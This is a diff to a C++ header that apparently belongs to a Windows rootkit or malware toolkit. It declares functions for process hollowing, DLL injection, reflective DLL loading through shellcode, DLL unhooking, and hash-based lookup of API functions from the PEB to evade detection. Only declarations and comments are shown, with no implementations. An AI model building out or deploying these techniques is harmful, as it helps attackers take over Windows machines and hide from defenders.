@@ -2,20 +2,27 @@
 #pragma warning(disable: 26812) // The enum type is unscoped. Prefer 'enum class' over 'enum'
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "taskschd.lib")
 
 #include <Windows.h>
 #include <winternl.h>
+#include <comdef.h>
+#include <taskschd.h>
 #include <VersionHelpers.h>
 #include <Shlwapi.h>
 #include <Psapi.h>
 #include <aclapi.h>
 #include <sddl.h>
 #include <initguid.h>
-#include <MSTask.h>
 #include <stdio.h>
 #include <cwchar>
 #include <time.h>
 #include "ntdll.h"
+
+/// <summary>
+/// Rotates a value right by a defined number of bits.
+/// </summary>
+#define ROTR(value, bits) ((DWORD)(value) >> (bits) | (DWORD)(value) << (32 - (bits)))
 
 // These preprocessor definitions must match the constants in GlobalAssemblyInfo.cs
 
@@ -482,6 +489,15 @@ HANDLE CreatePublicNamedPipe(LPCWSTR name);
 /// </returns>
 BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit);
 /// <summary>
+/// Retrieves a function pointer from the PEB.
+/// </summary>
+/// <param name="moduleHash">The hash of the module name. The module must be loaded.</param>
+/// <param name="functionHash">The hash of the function name.</param>
+/// <returns>
+/// A pointer to the function, or NULL, if the function could not be found.
+/// </returns>
+LPVOID PebGetProcAddress(DWORD moduleHash, DWORD functionHash);
+/// <summary>
 /// Creates a new process using the process hollowing technique.
 /// <para>The bitness of the current process, the created process and the payload must match.</para>
 /// </summary>
@@ -509,22 +525,23 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload);
 /// </returns>
 BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast);
 /// <summary>
-/// Gets the RVA of an exported function called "ReflectiveDllMain".
+/// Gets the file offset of an exported function from an executable file.
 /// </summary>
-/// <param name="dll">A buffer with the DLL file.</param>
+/// <param name="image">A buffer with the executable file.</param>
+/// <param name="functionName">The name of the exported function.</param>
 /// <returns>
-/// The RVA of the exported function; or 0, if this function fails.
+/// The file offset of the exported function; or 0, if this function fails.
 /// </returns>
-DWORD GetReflectiveDllMain(LPBYTE dll);
+DWORD GetExecutableFunction(LPBYTE image, LPCSTR functionName);
 /// <summary>
 /// Converts a RVA to a file offset.
 /// </summary>
-/// <param name="dll">A buffer with the DLL file.</param>
+/// <param name="image">A buffer with the executable file.</param>
 /// <param name="rva">The RVA to convert.</param>
 /// <returns>
 /// The file offset converted from the specified RVA; or 0, if this function fails.
 /// </returns>
-DWORD RvaToOffset(LPBYTE dll, DWORD rva);
+DWORD RvaToOffset(LPBYTE image, DWORD rva);
 /// <summary>
 /// Unhooks a DLL by replacing the .text section with the original DLL section.
 /// </summary>
@@ -746,10 +763,31 @@ PNEW_PROCESS_LISTENER NewProcessListener(DWORD interval, PROCESSIDCALLBACK callb
 /// <param name="callback">The function that is called, when a command is received by another process.</param>
 VOID ControlPipeListener(CONTROLCALLBACK callback);
 
+#ifdef EXPORT_REFLECTIVE_DLL_MAIN
+/// <summary>
+/// Position independent shellcode that loads the DLL after it was written to the remote process memory.
+/// <para>This is the main entry point for reflective DLL injection.</para>
+/// </summary>
+/// <param name="dllBase">A pointer to the beginning of the DLL file.</param>
+/// <returns>
+/// If this function succeeds, the return value of DllMain;
+/// otherwise, FALSE.
+/// </returns>
+__declspec(dllexport) BOOL WINAPI ReflectiveDllMain(LPBYTE dllBase);
+#endif
+
 namespace nt
 {
 	NTSTATUS NTAPI NtQueryObject(HANDLE handle, nt::OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength);
 	NTSTATUS NTAPI NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer);
 	NTSTATUS NTAPI RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue);
 	NTSTATUS NTAPI RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb);
+}
+
+// Shellcode variants of libc functions; Used by the reflective loader, prior to any DLL's being loaded
+namespace libc
+{
+	VOID memcpy(LPBYTE dest, LPBYTE src, DWORD size);
+	DWORD strhash(LPCSTR str);
+	DWORD strhashi(LPCSTR str, USHORT length);
 }
